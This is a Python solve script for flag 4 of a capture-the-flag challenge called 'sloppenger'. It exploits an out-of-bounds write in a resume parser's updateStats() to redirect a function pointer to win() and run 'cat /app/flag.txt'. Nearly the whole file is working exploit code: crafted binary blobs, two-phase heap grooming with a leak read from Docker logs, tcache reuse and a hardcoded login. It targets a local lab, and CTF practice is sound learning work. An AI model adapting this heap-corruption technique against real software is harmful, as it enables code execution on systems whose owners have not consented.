#!/usr/bin/env python3
"""
Solve script for Flag 4 of sloppenger CTF.

Exploit: updateStats() OOB write via inflated stat_cnt redirects
skill_get_short_name → win() → system("cat /app/flag.txt").

Two-phase heap grooming:
  Phase 1 (probe)  - 1507-item resume reveals item[0]'s heap position
                     via OOB stat scan in Docker logs
  Phase 2 (exploit)- With correct j inflates, OOB write fires on item[6]
                     which came from Phase 1's item[0] via tcache LIFO reuse
"""
import requests
import struct
import subprocess
import time
import re
import sys

BASE = "http://localhost:5000"
RECEIVER_UUID = 14   # ResumeReceiver

PROBE_SENTINEL = 0x1234567890ABCDEF  # SKILL0 level in Phase 1; unique marker
TRIGGER_CAT    = 0xDEADBEEFCAFEBABE  # category value that triggers OOB write
DELTA          = 3761                  # win - skill_get_short_name (offset in libresume.so)

# max inflate count for probe (stat_cnt = N_PROBE+1 covers ~N_PROBE*16 bytes)
N_PROBE_INFLATES = 2000


# ──────────────────────────── RSME builder ────────────────────────────

def _pad(v, n):
    if isinstance(v, str):
        v = v.encode()
    return v[:n].ljust(n, b'\x00')

def skill_rec(name, cat, level):
    return (2, _pad(name, 16) + struct.pack('<QQ', cat, level))

def build_rsme(*records):
    cnt = len(records)
    header = b'RSME' + b'\x00\x00\x00\x00' + struct.pack('<I', cnt)
    off = 12 + cnt * 12
    table = b''
    body = b''
    for typ, data in records:
        table += struct.pack('<IQ', typ, off)
        body += data
        off += len(data)
    return header + table + body


# ──────────────────────── Resume constructors ─────────────────────────

def make_phase1_probe():
    """
    1507 items:
      item[0]  = SKILL0 (cat=1, level=PROBE_SENTINEL)   ← unique marker
      item[1]  = DUMMY  (cat=1, level=0)                 ← cat reuse, no realloc
      item[2..6] = INFLATE 0..4
      item[7..N_PROBE+1] = INFLATE 5..N_PROBE-1

    stat_cnt after parsing = 1 + N_PROBE (SKILL0 + N_PROBE unique-cat inflates)
    preview() does OOB stat scan over 1+N_PROBE entries.
    At index j: category field overlaps item[0].level = PROBE_SENTINEL → logged.
    """
    recs = [
        skill_rec("skill0",    1, PROBE_SENTINEL),  # item[0]
        skill_rec(b"dummy\x00", 1, 0),               # item[1]
        skill_rec("inf0", 200, 0),                   # item[2]
        skill_rec("inf1", 201, 0),                   # item[3]
        skill_rec("inf2", 202, 0),                   # item[4]
        skill_rec("inf3", 203, 0),                   # item[5]
        skill_rec("inf4", 204, 0),                   # item[6]
    ]
    for i in range(5, N_PROBE_INFLATES):
        recs.append(skill_rec(f"i{i}", 205 + i, 0))
    return build_rsme(*recs)


def make_phase2_exploit(j):
    """
    j+8 items:
      item[0]   = SKILL0  (cat=1, level=5)             ← from Phase1 item[6] via tcache
      item[1..5]= FILLER  (cat=1, level=0) ×5          ← drain Phase1 items[5..1]
      item[6]   = TARGET  (cat=1, level=TRIGGER_CAT,
                           short_name="cat /app/flag.txt") ← Phase1 item[0]
      item[7..j+6]  = INFLATE×j (unique cats, level=0) ← pump stat_cnt to 1+j
      item[j+7] = TRIGGER (cat=TRIGGER_CAT, level=DELTA) ← fires OOB write

    OOB write lands on item[6].get_short_name → += DELTA → win().
    preview() then calls resumee_skill_short_name(h, 6) → win(skill_ptr)
              → system("cat /app/flag.txt") → flag in Docker logs.
    """
    recs = [
        skill_rec("skill0",      1, 5),
        skill_rec(b"filler1\x00", 1, 0),
        skill_rec(b"filler2\x00", 1, 0),
        skill_rec(b"filler3\x00", 1, 0),
        skill_rec(b"filler4\x00", 1, 0),
        skill_rec(b"filler5\x00", 1, 0),
        skill_rec(b"cat /app/flag.txt\x00", 1, TRIGGER_CAT),  # TARGET
    ]
    for i in range(j):
        recs.append(skill_rec(f"i{i}", 1000 + i, 0))
    recs.append(skill_rec("trigger", TRIGGER_CAT, DELTA))
    return build_rsme(*recs)


# ─────────────────────────── Web API helpers ──────────────────────────

def login(username, password):
    s = requests.Session()
    s.post(f'{BASE}/login',
           data={'username': username, 'password': password},
           allow_redirects=False, timeout=10)
    return s

def get_hmac(session):
    return session.get(f'{BASE}/api/hmac', timeout=5).json()["hmac"]

def send_plaintext_message(session, receiver_uuid, blob: bytes, hmac: str):
    pkt = {
        "plaintext":     blob.hex(),
        "protocol":      "PLAINTEXT",
        "receiver_uuid": receiver_uuid,
        "sid_hmac":      hmac,
    }
    r = session.post(f'{BASE}/api/send_message', json=pkt,
                     allow_redirects=False, timeout=15)
    return r.status_code

def docker_logs(since_seconds=30):
    result = subprocess.run(
        ['docker', 'logs', '--since', f'{since_seconds}s', 'dist-src-pwn_client-1'],
        capture_output=True, text=True, errors='replace'
    )
    return result.stdout + result.stderr


# ─────────────────────────────── Main ────────────────────────────────

def main():
    print("[*] Logging in as ResumeSender...")
    session = login("ResumeSender", "betatestpassword")
    hmac = get_hmac(session)
    print(f"    HMAC: {hmac[:16]}...")

    # ── Phase 1: Probe ──────────────────────────────────────────────
    print(f"\n[*] Phase 1 – sending probe resume ({N_PROBE_INFLATES+2} items)...")
    p1 = make_phase1_probe()
    print(f"    Size: {len(p1)} bytes")
    rc = send_plaintext_message(session, RECEIVER_UUID, p1, hmac)
    print(f"    HTTP status: {rc}")

    wait = 10
    print(f"[*] Waiting {wait}s for client.py to process Phase 1...")
    time.sleep(wait)

    print("[*] Scanning Docker logs for PROBE_SENTINEL...")
    logs = docker_logs(since_seconds=wait + 5)

    # Stats line format: "Stats: cat=V total=V, cat=V total=V, ..."
    pat = re.compile(r'cat=(\d+) total=(\d+)')
    all_stats = pat.findall(logs)
    print(f"    Found {len(all_stats)} stat entries in logs")

    j = None
    for idx, (cat_s, _total_s) in enumerate(all_stats):
        if int(cat_s) == PROBE_SENTINEL:
            j = idx
            print(f"    PROBE_SENTINEL found at stat index {j}")
            break

    if j is None:
        print("[!] PROBE_SENTINEL not found in Docker logs!")
        print("    Log tail:")
        print(logs[-3000:])
        sys.exit(1)

    if j > 4090:
        print(f"[!] j = {j} exceeds max item count – heap too fragmented.")
        sys.exit(1)

    print(f"[+] j = {j}  (will use {j} inflate skills in Phase 2)")

    # ── Phase 2: Exploit ────────────────────────────────────────────
    total_items = j + 8
    print(f"\n[*] Phase 2 – sending exploit resume ({total_items} items)...")
    p2 = make_phase2_exploit(j)
    print(f"    Size: {len(p2)} bytes")
    rc = send_plaintext_message(session, RECEIVER_UUID, p2, hmac)
    print(f"    HTTP status: {rc}")

    wait2 = 8
    print(f"[*] Waiting {wait2}s for client.py to process Phase 2...")
    time.sleep(wait2)

    print("[*] Checking Docker logs for flag...")
    logs2 = docker_logs(since_seconds=wait2 + 5)

    flag = re.search(r'ICO\{[^}]+\}', logs2)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0)}")
    else:
        print("[!] Flag not found. Log tail:")
        print(logs2[-3000:])


if __name__ == "__main__":
    main()
